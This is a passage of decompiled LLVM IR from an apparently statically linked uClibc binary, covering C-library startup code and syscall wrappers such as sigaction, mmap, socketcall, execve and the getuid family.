  %v1_80516811 = inttoptr i32 %v1_805165d to i32*
  %v2_80516812 = load i32, i32* %v1_80516811, align 4
  %v3_80516813 = icmp eq i32 %v2_80516812, 0
  %v1_805168410 = icmp eq i1 %v3_80516813, false
  br i1 %v1_805168410, label %dec_label_pc_8051666.lr.ph, label %dec_label_pc_8051686

dec_label_pc_8051666.lr.ph:                       ; preds = %dec_label_pc_8051681.preheader
  %v3_8051646 = ptrtoint i32* %stack_var_-168 to i32
  %v3_8051671 = add i32 %v3_8051646, 32
  br label %dec_label_pc_8051666

dec_label_pc_8051666:                             ; preds = %dec_label_pc_8051666.lr.ph, %dec_label_pc_805167e
  %v1_8051671 = phi i32 [ %v2_80516812, %dec_label_pc_8051666.lr.ph ], [ %v2_8051681, %dec_label_pc_805167e ]
  %v0_8051670 = phi i32 [ %v1_805165d, %dec_label_pc_8051666.lr.ph ], [ %v1_805167e, %dec_label_pc_805167e ]
  %v6_805166b = icmp ugt i32 %v1_8051671, 14
  br i1 %v6_805166b, label %dec_label_pc_805167e, label %dec_label_pc_805166d

dec_label_pc_805166d:                             ; preds = %dec_label_pc_8051666
  store i32 %v0_8051670, i32* %stack_var_-168, align 4
  %v2_8051671 = mul i32 %v1_8051671, 8
  %v4_8051671 = add i32 %v3_8051671, %v2_8051671
  %v3_8051676 = inttoptr i32 %v4_8051671 to i16*
  %v4_8051676 = call i32 @memcpy(i16* %v3_8051676, i32 %v0_8051670, i32 8)
  %v0_805167e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805167e

dec_label_pc_805167e:                             ; preds = %dec_label_pc_8051666, %dec_label_pc_805166d
  %v0_805167e = phi i32 [ %v0_8051670, %dec_label_pc_8051666 ], [ %v0_805167e.pre, %dec_label_pc_805166d ]
  %v1_805167e = add i32 %v0_805167e, 8
  store i32 %v1_805167e, i32* @ebx, align 4
  %v1_8051681 = inttoptr i32 %v1_805167e to i32*
  %v2_8051681 = load i32, i32* %v1_8051681, align 4
  %v3_8051681 = icmp eq i32 %v2_8051681, 0
  %v1_8051684 = icmp eq i1 %v3_8051681, false
  br i1 %v1_8051684, label %dec_label_pc_8051666, label %dec_label_pc_8051686

dec_label_pc_8051686:                             ; preds = %dec_label_pc_805167e, %dec_label_pc_8051681.preheader
  store i32 %v2_8051648, i32* @eax, align 4
  %v0_805168a = call i32 @_dl_aux_init()
  store i32 %v0_805168a, i32* @eax, align 4
  %v0_805168f = call i32 @__GI___uClibc_init()
  %v1_8051698 = icmp eq i32 %tmp25, 0
  %v1_805169a = icmp eq i1 %v1_8051698, false
  br i1 %v1_805169a, label %dec_label_pc_80516a0, label %dec_label_pc_805169c

dec_label_pc_805169c:                             ; preds = %dec_label_pc_8051686
  %v1_805169c = and i32 %tmp25, -65536
  %v2_805169c = or i32 %v1_805169c, 4096
  br label %dec_label_pc_80516a0

dec_label_pc_80516a0:                             ; preds = %dec_label_pc_8051686, %dec_label_pc_805169c
  %v0_80516a0 = phi i32 [ %tmp25, %dec_label_pc_8051686 ], [ %v2_805169c, %dec_label_pc_805169c ]
  store i32 %v0_80516a0, i32* @global_var_80603b0.188, align 16
  %v13_80516a5 = icmp eq i32 %tmp24, -1
  %v1_80516aa = icmp eq i1 %v13_80516a5, false
  br i1 %v1_80516aa, label %dec_label_pc_80516d5, label %dec_label_pc_80516ac

dec_label_pc_80516ac:                             ; preds = %dec_label_pc_80516a0
  %v0_80516ac = call i32 @getuid()
  store i32 %v0_80516ac, i32* @ebx, align 4
  %v0_80516b3 = call i32 @geteuid()
  %v0_80516b8 = load i32, i32* @ebx, align 4
  %v12_80516b8 = icmp eq i32 %v0_80516b8, %v0_80516b3
  %v1_80516ba = icmp eq i1 %v12_80516b8, false
  br i1 %v1_80516ba, label %dec_label_pc_80516eb, label %dec_label_pc_80516bc

dec_label_pc_80516bc:                             ; preds = %dec_label_pc_80516ac
  %v0_80516bc = call i32 @getgid()
  store i32 %v0_80516bc, i32* @ebx, align 4
  %v0_80516c3 = call i32 @getegid()
  %v0_80516c8 = load i32, i32* @ebx, align 4
  %v12_80516c8 = icmp eq i32 %v0_80516c8, %v0_80516c3
  %v1_80516ca = icmp eq i1 %v12_80516c8, false
  br i1 %v1_80516ca, label %dec_label_pc_80516eb, label %dec_label_pc_80516cc.thread

dec_label_pc_80516cc.thread:                      ; preds = %dec_label_pc_80516bc
  br label %dec_label_pc_8051715

dec_label_pc_80516d5:                             ; preds = %dec_label_pc_80516a0
  %v15_80516d5 = icmp eq i32 %tmp24, %tmp23
  %v1_80516d9 = icmp eq i1 %v15_80516d5, false
  br i1 %v1_80516d9, label %dec_label_pc_80516eb, label %dec_label_pc_80516db

dec_label_pc_80516db:                             ; preds = %dec_label_pc_80516d5
  br label %dec_label_pc_80516eb

dec_label_pc_80516eb:                             ; preds = %dec_label_pc_80516db, %dec_label_pc_80516d5, %dec_label_pc_80516bc, %dec_label_pc_80516ac
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_80516f2 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8051701 = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8051710 = call i32 @__check_one_fd()
  br label %dec_label_pc_8051715

dec_label_pc_8051715:                             ; preds = %dec_label_pc_80516cc.thread, %dec_label_pc_80516eb
  store i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32* %esi.global-to-local, align 4
  %v0_805171a = load i32, i32* @edi, align 4
  %v1_805171a = inttoptr i32 %v0_805171a to i32*
  %v2_805171a = load i32, i32* %v1_805171a, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32* %esi.global-to-local, align 4
  store i32 %v2_805171a, i32* inttoptr (i32 134586648 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg4, i32* @global_var_80603b4.260, align 4
  br i1 icmp ugt (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582501), i32 6), label %dec_label_pc_805173a, label %dec_label_pc_8051746

dec_label_pc_805173a:                             ; preds = %dec_label_pc_8051715, %dec_label_pc_805173a
  %v4_805173a49 = phi i32 [ %v1_8051741, %dec_label_pc_805173a ], [ 0, %dec_label_pc_8051715 ]
  %v5_805173a = mul i32 %v4_805173a49, 4
  %v6_805173a = add i32 %v5_805173a, ptrtoint (i32* @global_var_80590e8.258 to i32)
  %v7_805173a = inttoptr i32 %v6_805173a to i32*
  %v8_805173a = load i32, i32* %v7_805173a, align 4
  call void @__pseudo_call(i32 %v8_805173a)
  %v0_8051741 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051741 = add i32 %v0_8051741, 1
  store i32 %v1_8051741, i32* %ebx.global-to-local, align 4
  %v1_8051742.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8051742 = icmp ult i32 %v1_8051741, %v1_8051742.pre
  br i1 %v7_8051742, label %dec_label_pc_805173a, label %dec_label_pc_8051746

dec_label_pc_8051746:                             ; preds = %dec_label_pc_805173a, %dec_label_pc_8051715
  call void @__pseudo_call(i32 %arg3)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32 2), i32 0), label %dec_label_pc_805175e, label %dec_label_pc_805176a

dec_label_pc_805175e:                             ; preds = %dec_label_pc_8051746, %dec_label_pc_805175e
  %v4_805175e46 = phi i32 [ %v1_8051765, %dec_label_pc_805175e ], [ 0, %dec_label_pc_8051746 ]
  store i32 ptrtoint (i32* @global_var_8051765.267 to i32), i32* %stack_var_-168, align 4
  %v5_805175e = mul i32 %v4_805175e46, 4
  %v6_805175e = add i32 %v5_805175e, ptrtoint (i32* @global_var_80590e8.258 to i32)
  %v7_805175e = inttoptr i32 %v6_805175e to i32*
  %v8_805175e = load i32, i32* %v7_805175e, align 4
  call void @__pseudo_call(i32 %v8_805175e)
  %v0_8051765 = load i32, i32* @ebx, align 4
  %v1_8051765 = add i32 %v0_8051765, 1
  store i32 %v1_8051765, i32* @ebx, align 4
  %v1_8051766.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_8051766 = icmp ult i32 %v1_8051765, %v1_8051766.pre
  br i1 %v7_8051766, label %dec_label_pc_805175e, label %dec_label_pc_805176a

dec_label_pc_805176a:                             ; preds = %dec_label_pc_805175e, %dec_label_pc_8051746
  %v0_8051773 = load i32, i32* %stack_var_-168, align 4
  %v1_8051773 = call i32 @__errno_location(i32 %v0_8051773)
  %v1_8051778 = inttoptr i32 %v1_8051773 to i32*
  store i32 0, i32* %v1_8051778, align 4
  %v0_8051787 = call i32 @__GI___h_errno_location()
  store i32 %v0_8051787, i32* @eax, align 4
  %v1_805178c = inttoptr i32 %v0_8051787 to i32*
  store i32 0, i32* %v1_805178c, align 4
  call void @__pseudo_call(i32 %v0_80515f9)
  %v0_80517a8 = load i32, i32* @eax, align 4
  %v1_80517ab = call i32 @__GI_exit(i32 %v0_80517a8)
  %v0_80517b5 = load i32, i32* @ebx, align 4
  %v1_80517b5 = inttoptr i32 %v0_80517b5 to %sigcontext*
  %v2_80517b5 = call i32 @sigreturn(%sigcontext* %v1_80517b5)
  %v0_80517bd = load i32, i32* @ebx, align 4
  %v1_80517bd = inttoptr i32 %v0_80517bd to %sigcontext*
  %v2_80517bd = call i32 @sigreturn(%sigcontext* %v1_80517bd)
  ret i32 %v2_80517bd

; uselistorder directives
  uselistorder i32 %v1_8051765, { 1, 2, 0 }
  uselistorder i32 %v1_8051741, { 1, 2, 0 }
  uselistorder i32 %v2_8051681, { 1, 0 }
  uselistorder i32 %v1_805167e, { 2, 1, 0 }
  uselistorder i32 %v1_805165d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805165a, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 3, 4, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), i32 2), { 0, 2, 3, 1 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80590e8.258 to i32), i32 -134582504), { 0, 2, 1 }
  uselistorder i32 ()* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 4096, { 16, 17, 4, 15, 11, 12, 0, 1, 5, 13, 10, 14, 9, 6, 3, 7, 2, 8 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_805175e, { 1, 0 }
  uselistorder label %dec_label_pc_805173a, { 1, 0 }
  uselistorder label %dec_label_pc_8051715, { 1, 0 }
  uselistorder label %dec_label_pc_80516a0, { 1, 0 }
  uselistorder label %dec_label_pc_805167e, { 1, 0 }
  uselistorder label %dec_label_pc_8051666, { 1, 0 }
  uselistorder label %dec_label_pc_8051643, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_80517bf = load i32, i32* @esi, align 4
  %v0_80517c0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80517d5 = icmp eq i32* %arg2, null
  br i1 %v1_80517d5, label %dec_label_pc_8051828, label %dec_label_pc_80517d9

dec_label_pc_80517d9:                             ; preds = %entry
  %v2_80517d9 = load i32, i32* %arg2, align 4
  store i32 %v2_80517d9, i32* %stack_var_-148, align 4
  %v1_80517e2 = add i32 %tmp11, 4
  %v3_80517f4 = bitcast i32* %stack_var_-136 to i16*
  %v4_80517f4 = call i32 @memcpy(i16* %v3_80517f4, i32 %v1_80517e2, i32 128)
  %v1_80517f9 = add i32 %tmp11, 132
  %v2_8051813 = inttoptr i32 %v1_80517f9 to i8*
  %v3_8051813 = load i8, i8* %v2_8051813, align 1
  %v4_8051813 = and i8 %v3_8051813, 4
  %v5_8051813 = icmp eq i8 %v4_8051813, 0
  %v1_805181a = icmp eq i1 %v5_8051813, false
  br i1 %v1_805181a, label %dec_label_pc_8051828, label %dec_label_pc_805181c

dec_label_pc_805181c:                             ; preds = %dec_label_pc_80517d9
  br label %dec_label_pc_8051828

dec_label_pc_8051828:                             ; preds = %dec_label_pc_805181c, %dec_label_pc_80517d9, %entry
  %v1_805182a = icmp eq i32 %arg3, 0
  br i1 %v1_805182a, label %dec_label_pc_8051832, label %dec_label_pc_805182e

dec_label_pc_805182e:                             ; preds = %dec_label_pc_8051828
  %v2_805182e = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_8051832

dec_label_pc_8051832:                             ; preds = %dec_label_pc_8051828, %dec_label_pc_805182e
  %v0_8051841 = phi i32 [ 0, %dec_label_pc_8051828 ], [ %v2_805182e, %dec_label_pc_805182e ]
  br i1 %v1_80517d5, label %dec_label_pc_805183f, label %dec_label_pc_8051838

dec_label_pc_8051838:                             ; preds = %dec_label_pc_8051832
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805183f

dec_label_pc_805183f:                             ; preds = %dec_label_pc_8051832, %dec_label_pc_8051838
  %v0_8051842 = phi %sigaction* [ null, %dec_label_pc_8051832 ], [ %phitmp, %dec_label_pc_8051838 ]
  %v5_805184a = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_8051842, i32 %v0_8051841, i32 8)
  store i32 %v5_805184a, i32* %ebx.global-to-local, align 4
  br i1 %v1_805182a, label %dec_label_pc_805188d, label %dec_label_pc_8051858

dec_label_pc_8051858:                             ; preds = %dec_label_pc_805183f
  %v2_8051858 = icmp slt i32 %v5_805184a, 0
  br i1 %v2_8051858, label %dec_label_pc_805188d, label %dec_label_pc_805185c

dec_label_pc_805185c:                             ; preds = %dec_label_pc_8051858
  %v3_805185c = load i32, i32* %stack_var_-288, align 4
  %v2_8051860 = inttoptr i32 %arg3 to i32*
  store i32 %v3_805185c, i32* %v2_8051860, align 4
  %v2_8051868 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805186d = add i32 %arg3, 4
  %v3_8051871 = inttoptr i32 %v1_805186d to i16*
  %v4_8051871 = call i32 @memcpy(i16* %v3_8051871, i32 %v2_8051868, i32 128)
  %v2_805187a = add i32 %arg3, 132
  %v3_805187a = inttoptr i32 %v2_805187a to i32*
  %v2_8051887 = add i32 %arg3, 136
  %v3_8051887 = inttoptr i32 %v2_8051887 to i32*
  %v0_805188d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805188d

dec_label_pc_805188d:                             ; preds = %dec_label_pc_8051858, %dec_label_pc_805183f, %dec_label_pc_805185c
  %v0_805188d = phi i32 [ %v5_805184a, %dec_label_pc_8051858 ], [ %v5_805184a, %dec_label_pc_805183f ], [ %v0_805188d.pre, %dec_label_pc_805185c ]
  store i32 %v0_80517c0, i32* @ebx, align 4
  store i32 %v0_80517bf, i32* @esi, align 4
  ret i32 %v0_805188d

; uselistorder directives
  uselistorder i1 %v1_805182a, { 1, 0 }
  uselistorder i1 %v1_80517d5, { 1, 0 }
  uselistorder i32* null, { 1, 5, 2, 6, 7, 8, 9, 10, 11, 0, 12, 13, 14, 15, 16, 3, 4 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_805188d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805183f, { 1, 0 }
  uselistorder label %dec_label_pc_8051832, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_805189b = load i32, i32* @eax, align 4
  %v1_805189d = sub i32 0, %v0_805189b
  %v1_805189f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_80518a4 = inttoptr i32 %v1_805189f to i32*
  store i32 %v1_805189d, i32* %v2_80518a4, align 4
  ret i32 -1
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_80518b0 = load i32, i32* @ebx, align 4
  %v2_80518b7 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_80518b7, i32* @ebx, align 4
  %v8_80518bb = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_80518b0, i32* @ebx, align 4
  %v3_80518c4 = icmp ugt i32 %v8_80518bb, -4096
  call void @__pseudo_cond_branch(i1 %v3_80518c4, i32 134551704)
  ret i32 %v8_80518bb

; uselistorder directives
  uselistorder i32 %v8_80518bb, { 1, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134551704, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80518cc = load i32, i32* @ebx, align 4
  store i32 %v0_80518cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_80518df = call i32 @int80_syscall(i32 102)
  store i32 %v1_80518df, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_80518df, -4095
  br i1 %tmp8, label %dec_label_pc_80518f8, label %dec_label_pc_80518ec

dec_label_pc_80518ec:                             ; preds = %entry
  %v0_80518ec = load i32, i32* %stack_var_-4, align 4
  %v1_80518ec = call i32 @__errno_location(i32 %v0_80518ec)
  %v0_80518f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80518f1 = sub i32 0, %v0_80518f1
  %v2_80518f3 = inttoptr i32 %v1_80518ec to i32*
  store i32 %v1_80518f1, i32* %v2_80518f3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80518f8

dec_label_pc_80518f8:                             ; preds = %entry, %dec_label_pc_80518ec
  %v0_80518f8 = phi i32 [ %v1_80518df, %entry ], [ -1, %dec_label_pc_80518ec ]
  %v2_80518fa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80518fa, i32* @edx, align 4
  %v2_80518fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80518fc, i32* @ebx, align 4
  ret i32 %v0_80518f8

; uselistorder directives
  uselistorder i32 %v1_80518df, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80518f8, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8051901 = load i32, i32* @esi, align 4
  store i32 %v0_8051901, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8051915 = load i32, i32* @ebx, align 4
  %v7_805191d = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805191d, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_805191d, -4095
  br i1 %tmp13, label %dec_label_pc_8051935, label %dec_label_pc_8051929

dec_label_pc_8051929:                             ; preds = %entry
  %v1_8051929 = call i32 @__errno_location(i32 %v0_8051915)
  %v0_805192e = load i32, i32* %esi.global-to-local, align 4
  %v1_805192e = sub i32 0, %v0_805192e
  %v2_8051930 = inttoptr i32 %v1_8051929 to i32*
  store i32 %v1_805192e, i32* %v2_8051930, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051935

dec_label_pc_8051935:                             ; preds = %entry, %dec_label_pc_8051929
  %v0_8051935 = phi i32 [ %v7_805191d, %entry ], [ -1, %dec_label_pc_8051929 ]
  %v2_8051938 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051938, i32* @esi, align 4
  ret i32 %v0_8051935

; uselistorder directives
  uselistorder i32 %v7_805191d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051935, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805193c = load i32, i32* @ebx, align 4
  store i32 %v0_805193c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_805194f = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_805194f, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_805194f, -4095
  br i1 %tmp9, label %dec_label_pc_8051968, label %dec_label_pc_805195c

dec_label_pc_805195c:                             ; preds = %entry
  %v0_805195c = load i32, i32* %stack_var_-4, align 4
  %v1_805195c = call i32 @__errno_location(i32 %v0_805195c)
  %v0_8051961 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051961 = sub i32 0, %v0_8051961
  %v2_8051963 = inttoptr i32 %v1_805195c to i32*
  store i32 %v1_8051961, i32* %v2_8051963, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051968

dec_label_pc_8051968:                             ; preds = %entry, %dec_label_pc_805195c
  %v0_8051968 = phi i32 [ %v4_805194f, %entry ], [ -1, %dec_label_pc_805195c ]
  %v2_805196a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805196a, i32* @edx, align 4
  %v2_805196c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805196c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051968

; uselistorder directives
  uselistorder i32 %v4_805194f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051968, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051970 = load i32, i32* @edi, align 4
  store i32 %v0_8051970, i32* %stack_var_-4, align 4
  %v4_8051974 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051974, i32* %edi.global-to-local, align 4
  %v0_8051980 = load i32, i32* @ebx, align 4
  %v5_8051988 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_8051988 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_8051988 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_8051988, [1 x i8*] %v8_8051988)
  store i32 %v9_8051988, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_8051988, -4095
  br i1 %tmp12, label %dec_label_pc_80519a0, label %dec_label_pc_8051994

dec_label_pc_8051994:                             ; preds = %entry
  %v1_8051994 = call i32 @__errno_location(i32 %v0_8051980)
  %v0_8051999 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051999 = sub i32 0, %v0_8051999
  %v2_805199b = inttoptr i32 %v1_8051994 to i32*
  store i32 %v1_8051999, i32* %v2_805199b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80519a0

dec_label_pc_80519a0:                             ; preds = %entry, %dec_label_pc_8051994
  %v0_80519a0 = phi i32 [ %v9_8051988, %entry ], [ -1, %dec_label_pc_8051994 ]
  %v2_80519a4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80519a4, i32* %edi.global-to-local, align 4
  ret i32 %v0_80519a0

; uselistorder directives
  uselistorder i32 %v9_8051988, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80519a0, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80519a8 = load i32, i32* @ebx, align 4
  store i32 %v0_80519a8, i32* %stack_var_-4, align 4
  %v1_80519b1 = call i32 @int80_syscall(i32 202)
  store i32 %v1_80519b1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80519b1, -4095
  br i1 %tmp6, label %dec_label_pc_80519c8, label %dec_label_pc_80519bc

dec_label_pc_80519bc:                             ; preds = %entry
  %v0_80519bc = load i32, i32* %stack_var_-4, align 4
  %v1_80519bc = call i32 @__errno_location(i32 %v0_80519bc)
  %v0_80519c1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519c1 = sub i32 0, %v0_80519c1
  %v2_80519c3 = inttoptr i32 %v1_80519bc to i32*
  store i32 %v1_80519c1, i32* %v2_80519c3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80519c8

dec_label_pc_80519c8:                             ; preds = %entry, %dec_label_pc_80519bc
  %v0_80519c8 = phi i32 [ %v1_80519b1, %entry ], [ -1, %dec_label_pc_80519bc ]
  %v2_80519cc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80519cc, i32* @ebx, align 4
  ret i32 %v0_80519c8

; uselistorder directives
  uselistorder i32 %v1_80519b1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80519c8, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80519d0 = load i32, i32* @ebx, align 4
  store i32 %v0_80519d0, i32* %stack_var_-4, align 4
  %v1_80519d9 = call i32 @int80_syscall(i32 201)
  store i32 %v1_80519d9, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80519d9, -4095
  br i1 %tmp6, label %dec_label_pc_80519f0, label %dec_label_pc_80519e4

dec_label_pc_80519e4:                             ; preds = %entry
  %v0_80519e4 = load i32, i32* %stack_var_-4, align 4
  %v1_80519e4 = call i32 @__errno_location(i32 %v0_80519e4)
  %v0_80519e9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80519e9 = sub i32 0, %v0_80519e9
  %v2_80519eb = inttoptr i32 %v1_80519e4 to i32*
  store i32 %v1_80519e9, i32* %v2_80519eb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80519f0

dec_label_pc_80519f0:                             ; preds = %entry, %dec_label_pc_80519e4
  %v0_80519f0 = phi i32 [ %v1_80519d9, %entry ], [ -1, %dec_label_pc_80519e4 ]
  %v2_80519f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80519f4, i32* @ebx, align 4
  ret i32 %v0_80519f0

; uselistorder directives
  uselistorder i32 %v1_80519d9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80519f0, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80519f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80519f8, i32* %stack_var_-4, align 4
  %v1_8051a01 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051a01, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051a01, -4095
  br i1 %tmp6, label %dec_label_pc_8051a18, label %dec_label_pc_8051a0c

dec_label_pc_8051a0c:                             ; preds = %entry
  %v0_8051a0c = load i32, i32* %stack_var_-4, align 4
  %v1_8051a0c = call i32 @__errno_location(i32 %v0_8051a0c)
  %v0_8051a11 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a11 = sub i32 0, %v0_8051a11
  %v2_8051a13 = inttoptr i32 %v1_8051a0c to i32*
  store i32 %v1_8051a11, i32* %v2_8051a13, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a18

dec_label_pc_8051a18:                             ; preds = %entry, %dec_label_pc_8051a0c
  %v0_8051a18 = phi i32 [ %v1_8051a01, %entry ], [ -1, %dec_label_pc_8051a0c ]
  %v2_8051a1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a1c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051a18

; uselistorder directives
  uselistorder i32 %v1_8051a01, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a18, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a20 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a20, i32* %stack_var_-4, align 4
